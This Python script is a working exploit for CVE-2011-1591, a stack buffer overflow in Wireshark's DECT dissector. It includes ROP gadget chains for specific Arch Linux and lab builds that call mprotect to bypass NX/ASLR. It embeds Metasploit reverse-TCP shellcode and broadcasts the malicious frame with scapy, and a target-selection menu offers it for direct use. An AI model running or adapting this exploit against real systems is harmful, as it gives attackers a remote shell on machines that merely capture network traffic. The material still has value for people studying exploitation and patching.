#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-

a = """
\n\t-- CVE: 2011-1591 : Wireshark <= 1.4.4 packet-dect.c dissect_dect() --\n
#
# -------- Team     : Consortium-of-Pwners
# -------- Author   : ipv
# -------- Impact   : high
# -------- Target   : Archlinux wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
# -------- Description
#
# This code exploits a remote stack based buffer overflow in the DECT dissector of
# wireshark. ROP chains aims to recover dynamically stack address, mprotect it and stack pivot to 
# shellcode located the payload. 
# All the process is automated, and bypass any NX/ALSR.
#
# Operating Systems tested : [see the summary] with scapy >= 2.5
# For any comments, remarks, news, please mail me : ipv _at_ [team] . net
###########################################################################\n"""


import sys, struct
if sys.version_info >= (2, 5):
   from scapy.all import *
else:
   from scapy import *

# align
def _x(v):
    return struct.pack("<I", v)

# Gadget Table - Arch linux v2010.05 default package 
#   - wireshark-cli-1.4.3-1-i686.pkg.tar.xz  
#   - wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
arch_rop_chain  = [

    # Safe SEIP overwrite
    _x(0x8069acb),                      # pop   ebx ;   pop esi ;   pop ebp
    _x(0), _x(0x80e9360), _x(0),        # fake (arg1, arg2, arg3), to avoid crash

    # mprotect 1st arg : stack & 0xffff0000
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x80f9d7f),                      # xchg ecx, eax
    _x(0x8061804),                      # pop eax
    _x(0xffff0000),                     # 
    _x(0x80c69f0),                      # xchg edi, eax
    _x(0x80ff067),                      # and ecx edi ; dec ecx  
    _x(0x8077c53),                      # inc ecx ; sub al 0x5d 
    _x(0x8061804),                      # pop eax
    _x(0x7f16a5d0),                     # avoid crash with dec dword [ecx-0x76fbdb8c] 
    _x(0x8048360),                      # xchg ecx eax 
    _x(0x8089f46),                      # xchg edx eax ; std ; dec dword [ecx-0x76fbdb8c] 
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x8067d92)*7,                    # ret
    # 1st arg of mprotect is on esp+48 address (see below)
    _x(0x80745f9),                      # mov [eax+0x50] edx ; pop ebp
    _x(0),

    # we search address of mprotect (@mprotect = @fopen + 0x6fe70) 
    _x(0x8065226),                      # pop eax 
    _x(0x81aca20-0xc),                  # got[fopen]
    _x(0x8074597),                      # mov eax [eax+0xc] 
    _x(0x8048360),                      # xchg ecx eax 
    _x(0x8065226),                      # pop eax 
    _x(0x6fe70),
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x806973d),                      # add ecx ebp 
    _x(0x08104f61),                     # jmp *%ecx
    _x(0x0811eb63),                     # pop ebx, pop esi, pop edi
    # mprotect args (base_addr, page size, mode)
    _x(0),                              # Stack Map that is updated dynamically (see upper)
    _x(0x10000),                        # PAGE size 0x1000 
    _x(0x7),                            # RWX Mode
    
    # now we can jump to our lower addressed shellcode by decreasing esp register 
    _x(0x8061804),                      # pop eax 
    _x(0xff+0x50),                      # esp will be decreased of 0xff + 0x50 bytes;
    _x(0x80b8fc8),                      # xchg edi eax 
    _x(0x8067d90),                      # push esp ; pop ebp
    _x(0x80acc63),                      # sub ebp, edi ; dec ecx
    _x(0x8081f2e),                      # xchg ebp eax
    _x(0x0806979e)                      # jmp *eax
]

# Gadget Table - Bt4 compiled without SSP/FortifySource
# Source wireshark 1.4.3
labs_rop_chain = [
    
    # Safe SEIP overwrite
    _x(0x08073fa1),                     # pop    ebx    ;    pop    esi    ;    pop    ebp
    _x(0), _x(0x0808c4d3), _x(0),       # fake (arg1, arg2, arg3), to avoid crash
    
    # sys_mprotect : eax=125(0x7D) ; ebx=address base ; ecx = size page ; edx = mode
    # mprotect 3r d arg
    _x(0x080e64cf),                     # pop edx ; pop es ; add cl cl
    _x(0x7), _x(0x0),                   # RWX mode 0x7

    # mprotect 1st arg (logical AND with stack address to get address base),
    _x(0x080a1711),                     # mov edi esp ; dec ecx 
    _x(0x0815b74f),                     # pop ecx 
    _x(0xffff0000),                     # 
    _x(0x0804c73c),                     # xchg ecx eax 
    _x(0x080fadd7),                     # and edi eax ; dec ecx
    _x(0x0804c73c),                     # xchg ecx eax 
    _x(0x080af344),                     # mov ebx edi ; dec ecx 
    
    # mprotect 2nd arg
    _x(0x0815b74f),                     # pop ecx
    _x(0x10000),                        # PAGE size 0x10000

    # int 0x80 : here vdso is not randomized, so, we use it!
    _x(0x80d8b71),                      # pop eax 
    _x(0x7D),                           # 0x7D = mprotect syscall
    _x(0x804e6df),                      # pop *esi
    _x(0xffffe411),                     # int 0x80 
    
    # _x(0xffffe414),                   # @sysenter in .vdso
    _x(0x080ab949),                     # jmp *esi
    
    # now we can jump to our lower addressed shellcode by decreasing esp register 
    _x(0x0815b74f),                     # pop ecx 
    _x(256),                            # esp will be decreased of 256bytes
    _x(0x080a1711),                     # mov edi esp ; dec ecx 
    _x(0x081087d3),                     # sub edi ecx ; dec ecx 
    _x(0x080f7cb1)                      # jmp *edi
]

addr_os = {
    # ID # OS                        # STACK SIZE      # GADGET TABLE
    1  : ["Arch Linux 2010.05    ",  0xb9,             arch_rop_chain], # wireshark-gtk-1.4.3-1-i686.pkg.tar.xz
    2  : ["Labs test             ",  0xbf,             labs_rop_chain],
	-1 : ["Debian 5.0.8 Lenny    ",  -3,               False],			# wireshark_1.0.2-3+lenny12_i386.deb
    -2 : ["Debian 6.0.2 Squeeze  ",  -1,               False],			# wireshark_1.2.11-6+squeeze1_i386.deb	
    -3 : ["Fedora 14             ",  -1,               False],			# wireshark-1.4.3-1.2.2.i586.rpm
    -4 : ["OpenSuse 11.3         ",  -1,               False],			# wireshark-1.4.3-1.2.2.i586.rpm
    -5 : ["Ubuntu 10.10 | 11.04  ",  -1,               False],			# 
    -6 : ["Gentoo *              ",  -2,               False]			# 
}

print a

def usage():
    print "Please select and ID >= 0 :\n"
    print "   ID    TARGET                        INFO"
    print "--------------------------------------------------------------------"
    for i in addr_os.iteritems():
        print "  %2d  -- %s       "%(i[0], i[1][0]), 
        if i[1][1] == -1:
            print "Default package uses LibSSP & Fortify Source"
        elif i[1][1] == -2:
            print "Compiled/Build with Fortify Source"
        elif i[1][1] == -3:
            print "DECT protocol not supported"
        else:
            print "VULN -> Stack size %d"%(i[1][1])

    sys.exit(1)

if len(sys.argv) == 1:
    usage()
elif addr_os.has_key(int(sys.argv[1])) is False:
    usage()
elif int(sys.argv[1]) < 0:
    usage()

target = addr_os[int(sys.argv[1])]
print "\n[+] Target : %s"%target[0]

rop_chain = "".join([ rop for rop in target[2]])

# msfpayload linux/x86/shell_reverse_tcp LHOST=127.0.0.1 C
rev_tcp_shell = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x53\x6a\x10\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


SEIP_SMASH = target[1]
print "\t[+] Length for smashing SEIP : 0x%x(%d)"%(SEIP_SMASH, SEIP_SMASH)

nopsled = "\x90"
head_nop = 50
shellcode = nopsled * head_nop + rev_tcp_shell + nopsled * (SEIP_SMASH-len(rev_tcp_shell) - head_nop)
payload = shellcode + rop_chain
# stack alignment
if (len(payload) % 2):
    diff = len(payload) % 2
    payload = payload[(2-diff):]
    
print "\t[+] Payload length : %d"%len(payload)

evil_packet = Ether(type=0x2323, dst="ff:ff:ff:ff:ff:ff") / payload
# evil_packet.show()

print "\t[+] Evil packet length : %d"%len(evil_packet)

print "\t[+] Sending packet to broadcast"
sendp(evil_packet)